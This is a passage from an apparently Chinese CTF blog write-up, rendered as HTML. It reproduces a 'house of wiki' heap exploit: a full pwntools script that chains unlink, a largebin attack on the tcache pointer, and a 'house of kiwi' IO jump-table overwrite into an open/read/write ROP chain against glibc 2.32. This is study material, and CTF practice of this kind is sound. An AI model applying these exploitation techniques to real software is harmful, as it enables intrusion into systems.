class="comment">#恢復largebin</span></span><br><span class="line">pay = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x208</span>+p64(<span class="number">0x431</span>)+p64(libc_base+<span class="number">0x1e3ff0</span>)*<span class="number">2</span>+p64(heap_adr+<span class="number">0x1350</span>)*<span class="number">2</span></span><br><span class="line">add(<span class="number">0x1240</span>,pay)</span><br><span class="line"><span class="comment">#原chunk5还在largebin  而tcahce struct被写为了原chunk4</span></span><br><span class="line"><span class="comment">#所以现在可以写chunk5去修改tcache struct内容</span></span><br><span class="line">pay = <span class="string">b&#x27;\x01&#x27;</span>*<span class="number">0x70</span></span><br><span class="line">pay = pay.ljust(<span class="number">0xe8</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(io_file_jumps+<span class="number">0x60</span>)</span><br><span class="line">pay = pay.ljust(<span class="number">0x168</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(io_helper_jimps+<span class="number">0xa0</span>)+p64(heap_adr+<span class="number">0x46f0</span>)</span><br><span class="line">add(<span class="number">0x420</span>,pay)</span><br><span class="line"></span><br><span class="line"><span class="comment">#house of kiwi</span></span><br><span class="line">add(<span class="number">0x100</span>,p64(setcontext+<span class="number">61</span>))<span class="comment">#这里会实现栈迁移</span></span><br><span class="line">add(<span class="number">0x200</span>,p64(target)+p64(ret))<span class="comment">#栈顶和rsp</span></span><br><span class="line">add(<span class="number">0x210</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x910</span>))<span class="comment">#修改top_chunk的size</span></span><br><span class="line"></span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;(: Size: &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x1000</span>))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;flag&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/2023/09/03/house-of-wiki%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694497926062-65be04ed-2089-4588-b99d-5de515acacb5.png" alt="img"><br>malloc函数过程<br><img src="/2023/09/03/house-of-wiki%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694497773963-722d8942-6825-4b19-bdcf-d7b4ce5e378f.png" alt="img"><br><img src="/2023/09/03/house-of-wiki%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694497812846-7244c38b-5aac-4ea7-9124-e69775168216.png" alt="img"><img src="/2023/09/03/house-of-wiki%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694497834885-0b500425-ee85-49db-961f-2d76684e9835.png" alt="img"><img src="/2023/09/03/house-of-wiki%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694498104074-f63435fc-7d6d-4437-9d09-4d8e478ca638.png" alt="img"><img src="/2023/09/03/house-of-wiki%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694497857691-781a9f95-becb-448b-8d12-98930c3b70b4.png" alt="img"><img src="/2023/09/03/house-of-wiki%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694498344016-161df218-fe52-4373-b124-e662defe5815.png" alt="img"><img src="/2023/09/03/house-of-wiki%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E7%8E%B0/1694497968875-1d06ae6f-f80a-4b40-82b9-cc5ff59d24bd.png" alt="img"></p><h4 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile = <span class="string">&#x27;./wiki&#x27;</span></span><br><span class="line">io=process(pwnfile)</span><br><span class="line"><span class="comment">#io=remote(&#x27;node4.buuoj.cn&#x27;,25500)</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.32.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">x</span>):</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(x))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content=<span class="string">b&#x27;\x00&#x27;</span></span>):</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;(: Size: &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">io.recvuntil(<span class="string">&quot;(: Content:&quot;</span>)</span><br><span class="line">io.send(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">io.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">io.sendline(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">4</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ban hook  2.32   保护全开     ban execv</span></span><br><span class="line"><span class="comment">#------------------------------------------------------- 泄漏地址</span></span><br><span class="line">add(<span class="number">0x418</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x1f8</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x428</span>)<span class="comment">#2与chunk3合并，维护原chunk3的fd、bk</span></span><br><span class="line">add(<span class="number">0x438</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x208</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x428</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x208</span>)<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)<span class="comment">#会和chunk3 合并 (0x430+0x440 = 0x870)</span></span><br><span class="line"><span class="comment">#修改原chunk3的size、为之后unlink准备</span></span><br><span class="line"><span class="comment">#同时会将chunk0、chunk5放入largebin</span></span><br><span class="line">pay = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x428</span>+p64(<span class="number">0xc91</span>)</span><br><span class="line">add(<span class="number">0x440</span>,pay)<span class="comment">#切割chunk2、3合并chunk0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>)<span class="comment">#chunk2、chunk3剩下部分2</span></span><br><span class="line">add(<span class="number">0x418</span>)<span class="comment">#chunk03</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x428</span>)<span class="comment">#chunk55</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#原chunk3的fd、bk还存在 </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">原chunk3 --&gt;fd chunk0</span></span><br><span class="line"><span class="string">原chunk3 --&gt;bk chunk5</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#修改原chunk0的bk</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">原chunk0 --&gt;bk chunk3+0x20</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">9</span>)<span class="comment">#原chunk02</span></span><br><span class="line"><span class="comment">#上面一步利用对输入末字节的截断把原chunkn0的bk末字节改为00，也就是原chunk0 bk--&gt;原chunk3</span></span><br><span class="line">add(<span class="number">0x418</span>)<span class="comment">#原chunk3+0x203</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">原chunk5 --&gt;fd chunk3+0x20</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#把原chunk5以及chunk3+0x20放入largebin</span></span><br><span class="line"><span class="comment">#这里是因为从unsortedbin中取出的话，fd、bk会被修改</span></span><br><span class="line">add(<span class="number">0x9f8</span>)<span class="comment">#为unlink准备3</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">原chunk5 --&gt;nextsize_fd chunk3+0x20</span></span><br><span class="line"><span class="string">原chunk5 --&gt;nextsize_bk chunk3+0x20</span></span><br><span class="line"><span class="string">chunk3+0x20 --&gt;nextsize_fd 原chunk5</span></span><br><span class="line"><span class="string">chunk3+0x20 --&gt;nextsize_bk 原chunk5</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">add(<span class="number">0x428</span>,<span class="string">b&#x27;\x00&#x27;</span>)<span class="comment">#chunk5--&gt;fd 原chunk35</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#这里修改的是实际第7个chunk 但序号为3</span></span><br><span class="line"><span class="comment">#修改的pre_size=0xc90,size=0xa00</span></span><br><span class="line">pay = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x200</span> + p64(<span class="number">0xc90</span>) + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">edit(<span class="number">6</span>,pay)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>)<span class="comment">#原chunk3+0x207</span></span><br><span class="line">add(<span class="number">0x208</span>)<span class="comment">#防止top_chukn合并8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#这里3实际是原chunk7位置，向上合并到原chunk3</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">fd : 原chunk5 --&gt; 原chunk3 --&gt; 原chunk0  </span></span><br><span class="line"><span class="string">bk : 原chunk0 --&gt; 原chunk3 --&gt; 原chunk5 </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">delete(<span class="number">3</span>)<span class="comment">#---------unlink</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">原chunk3 到chunk7 都合并了</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">pay = flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,p64(<span class="number">0x421</span>))</span><br><span class="line"><span class="comment">#修改原chunk3+0x20的size、同时chunk4的fd、bk会放入main_arena+xxx</span></span><br><span class="line">add(<span class="number">0x430</span>,pay) <span class="comment">#3</span></span><br><span class="line"><span class="comment">#将合并后的chunk放入largebin </span></span><br><span class="line">add(<span class="number">0x1600</span>)<span class="comment">#9</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line">libc_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">1680</span>-<span class="number">0x1e3ba0</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base---&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">heap_adr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x2b0</span></span><br><span class="line">log.success(<span class="string">&quot;heap_adr---&gt;&quot;</span>+<span class="built_in">hex</span>(heap_adr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#-------------------------------------  地址准备</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">思路就是修改IO的跳转指针，然后fflush刷新IO链表</span></span><br><span class="line"><span class="string">这里是修改 _IO_file_sync 指针为 setcontext+61 </span></span><br><span class="line"><span class="string">去控制程序流执行orw</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">io_file_jumps = libc_base + libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">io_helper_jimps = libc_base + <span class="number">0x1e48c0</span></span><br><span class="line"></span><br><span class="line">setcontext = libc_base + libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">op = libc_base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">re = libc_base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">wr = libc_base + libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">puts_adr = libc_base + libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x02858f</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x02ac3f</span></span><br><span class="line">pop_rdx_rbx = libc_base + <span class="number">0x01597d6</span></span><br><span class="line">ret = libc_base + <span class="number">0x026699</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------------------- 劫持TSL结构体去修改tcache struct地址  然后tcache struct attack</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#TLS = libc_base-0x2908</span></span><br><span class="line">TLS = libc_base + <span class="number">0x1eb578</span><span class="comment">#TSL段  这里存的是tcache struct attack地址</span></span><br><span class="line"></span><br><span class="line">target = heap_adr + <span class="number">0x8e0</span></span><br><span class="line">flag_adr = target + <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">orw = flat(</span><br><span class="line">   pop_rdi,flag_adr,pop_rsi,<span class="number">0</span>,op,</span><br><span class="line">   pop_rdi,<span class="number">3</span>,pop_rsi,flag_adr,pop_rdx_rbx,<span class="number">0x100</span>,<span class="number">0</span>,re,</span><br><span class="line">   pop_rdi,<span class="number">1</span>,pop_rsi,flag_adr,pop_rdx_rbx,<span class="number">0x40</span>,<span class="number">0</span>,wr</span><br><span class="line">   <span class="comment">#pop_rdi,flag_adr,puts_adr</span></span><br><span class="line">   ).ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)+<span class="string">b&#x27;flag\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">pay = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x208</span>+p64(<span class="number">0x431</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x428</span>+p64(<span class="number">0x211</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x208</span>+p64(<span class="number">0xa01</span>)</span><br><span class="line">add(<span class="number">0x1240</span>,pay)<span class="comment">#取走largebin10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在heap_adr + 0x8e0 处放入orw</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x440</span>,orw)<span class="comment">#0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>)<span class="comment">#11</span></span><br><span class="line">add(<span class="number">0x208</span>)<span class="comment">#防止合并12</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">4</span>)<span class="comment">#chunk4也是合并之后剩下的部分 size=0x1251</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#通过之前的unlink达到的堆覆盖去修改chunk5的 nextsize_bk</span></span><br><span class="line">pay = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x208</span>+p64(<span class="number">0x431</span>)+p64(libc_base+<span class="number">0x1e3ff0</span>)*<span class="number">2</span>+p64(heap_adr+<span class="number">0x1350</span>)+p64(TLS-<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x1240</span>,pay)<span class="comment">#4</span></span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x500</span>)<span class="comment">#----------largebin attack 5</span></span><br><span class="line"><span class="comment">#向TLS写入了11的地址</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x410</span>)<span class="comment">#11</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#恢復largebin 后续还要malloc 不恢复会报错</span></span><br><span class="line">pay = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x208</span>+p64(<span class="number">0x431</span>)+p64(libc_base+<span class="number">0x1e3ff0</span>)*<span class="number">2</span>+p64(heap_adr+<span class="number">0x1350</span>)*<span class="number">2</span></span><br><span class="line">add(<span class="number">0x1240</span>,pay)</span><br><span class="line"></span><br><span class="line"><span class="comment">#原chunk5还在largebin  而tcahce struct被写为了原chunk4</span></span><br><span class="line"><span class="comment">#所以现在可以写chunk5去修改tcache struct内容</span></span><br><span class="line">pay = <span class="string">b&#x27;\x01&#x27;</span>*<span class="number">0x70</span></span><br><span class="line">pay = pay.ljust(<span class="number">0xe8</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(io_file_jumps+<span class="number">0x60</span>)</span><br><span class="line">pay = pay.ljust(<span class="number">0x168</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(io_helper_jimps+<span class="number">0xa0</span>)+p64(heap_adr+<span class="number">0x46f0</span>)</span><br><span class="line">add(<span class="number">0x420</span>,pay)</span><br><span class="line"></span><br><span class="line"><span class="comment">#house of kiwi</span></span><br><span class="line">add(<span class="number">0x100</span>,p64(setcontext+<span class="number">61</span>))<span class="comment">#这里会实现栈迁移</span></span><br><span class="line">add(<span class="number">0x200</span>,p64(target)+p64(ret))<span class="comment">#rsp和rip</span></span><br><span class="line">add(<span class="number">0x210</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x910</span>))<span class="comment">#修改top_chunk </span></span><br><span class="line"><span class="comment">#当申请的大小大于top_chunk时会去执行_malloc_assret,这个函数会调用fflush,就会刷新IO链表</span></span><br><span class="line"><span class="comment">#也就是</span></span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;(: Size: &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x1000</span>))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
